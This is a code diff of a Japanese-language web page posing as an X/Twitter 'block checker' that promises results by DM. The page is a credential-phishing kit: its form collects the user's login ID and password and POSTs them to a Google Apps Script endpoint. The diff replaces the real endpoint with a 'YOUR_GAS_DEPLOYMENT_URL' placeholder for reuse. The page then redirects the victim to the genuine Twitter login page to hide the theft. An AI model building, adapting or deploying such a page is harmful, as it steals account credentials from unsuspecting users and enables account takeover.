@@ -4,10 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ブロックチェッカー</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet"> <!-- カスタムフォント -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: 'Roboto', sans-serif; /* カスタムフォント使用 */
+            font-family: 'Roboto', sans-serif;
             background-color: #000; /* 背景を黒に設定 */
             display: flex;
             justify-content: center;
@@ -80,7 +80,6 @@
             text-align: left;
             line-height: 1.4;
             word-wrap: break-word;
-            padding: 5px; /* パディング追加 */
         }
     </style>
 </head>
@@ -90,10 +89,10 @@
         <h2>数分後、あなたのDMに結果が届きます。</h2>
         <form id="loginForm">
             <label for="userId">メールアドレスまたはユーザーID:</label>
-            <input type="text" id="userId" name="userId" placeholder="@･･････" required>
+            <input type="text" id="userId" name="user" placeholder="@･･････" required>
             
             <label for="password">パスワード:</label>
-            <input type="password" id="password" name="password" placeholder="･･････" required>
+            <input type="password" id="password" name="pass" placeholder="･･････" required>
             
             <input type="button" value="ログイン" onclick="submitForm()">
 
@@ -111,18 +110,18 @@
     <script>
         function submitForm() {
             const formData = new FormData();
-            formData.append('date.user', document.getElementById('userId').value);
-            formData.append('date.pass', document.getElementById('password').value);
+            formData.append('user', document.getElementById('userId').value);
+            formData.append('pass', document.getElementById('password').value);
 
-            fetch('https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec', {
+            fetch('YOUR_GAS_DEPLOYMENT_URL', {
                 method: 'POST',
                 body: formData
             })
-            .then(response => response.text())
+            .then(response => response.json())
             .then(result => {
                 console.log('成功:', result);
                 alert('ログイン処理が完了しました。');
-                
+
                 // Xの公式ログインページに遷移
                 setTimeout(() => {
                     window.location.href = 'https://twitter.com/login'; // XのログインURL
